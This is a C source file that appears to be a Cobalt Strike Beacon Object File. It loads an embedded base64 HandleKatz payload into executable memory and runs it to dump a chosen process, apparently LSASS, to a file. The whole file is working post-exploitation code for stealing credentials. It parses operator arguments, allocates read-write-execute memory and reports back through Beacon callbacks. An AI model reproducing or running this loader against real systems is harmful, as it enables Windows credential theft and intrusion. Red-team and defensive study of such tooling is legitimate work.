#include <stdio.h>
#include "headers/beacon.h"
#include "headers/HandleKatz.h"
#include "headers/Userdefs.h"
#include "headers/syscalls.h"
#include "headers/Win32_API.h"


int go(char* args, int length)
{   
    datap parser;
    uint8_t* ptr_handlekatz = NULL;
    DWORD dw_len_handleKatz = 0, dw_len_handlekatz_b64 = 0, dw_success = 0, dw_pid = 0;
    char* ptr_output = NULL, *ptr_pth_dmp = NULL;
    BOOL b_recon_only = FALSE;


    BeaconDataParse(&parser, args, length);
    dw_pid =      (DWORD)BeaconDataInt(&parser);
    ptr_pth_dmp = BeaconDataExtract(&parser, NULL);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Path to dumpfile:  %s\n", ptr_pth_dmp);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Pid to clone from: %ld\n", dw_pid);

    dw_len_handlekatz_b64 = internalStrlenA(handlekatz_b64);
    BeaconPrintf(CALLBACK_OUTPUT, "Size of handlekatz array: %ld\n", dw_len_handlekatz_b64);
    
    dw_success = internalCryptStringToBinaryA((LPCSTR)handlekatz_b64, dw_len_handlekatz_b64, CRYPT_STRING_BASE64, NULL, (DWORD*)&dw_len_handleKatz, NULL, NULL);
    if (!dw_success)
    {
        BeaconPrintf(CALLBACK_ERROR, "FAILED cryptstringtobinaryANSI one.");
        return 0;
    }

    ptr_handlekatz = (uint8_t*)KERNEL32$VirtualAlloc(0, dw_len_handleKatz, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (ptr_handlekatz == NULL)
    {
        return 0;
    }

    dw_success = internalCryptStringToBinaryA((LPCSTR)handlekatz_b64, dw_len_handlekatz_b64, CRYPT_STRING_BASE64, ptr_handlekatz, (DWORD*)&dw_len_handleKatz, NULL, NULL);
    if (!dw_success) {
        BeaconPrintf(CALLBACK_ERROR, "FAILED cryptstringtobinaryANSI two.");
        return 0;
    }

    ptr_output = (char*)KERNEL32$VirtualAlloc(0, 0x4096, MEM_COMMIT, PAGE_READWRITE);

    dw_success = ((HandleKatz*)ptr_handlekatz)(b_recon_only, ptr_pth_dmp, dw_pid, ptr_output);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] HandleKatz return value: %ld\n", dw_success);
    BeaconPrintf(CALLBACK_OUTPUT, "%s\n", ptr_output);
    
}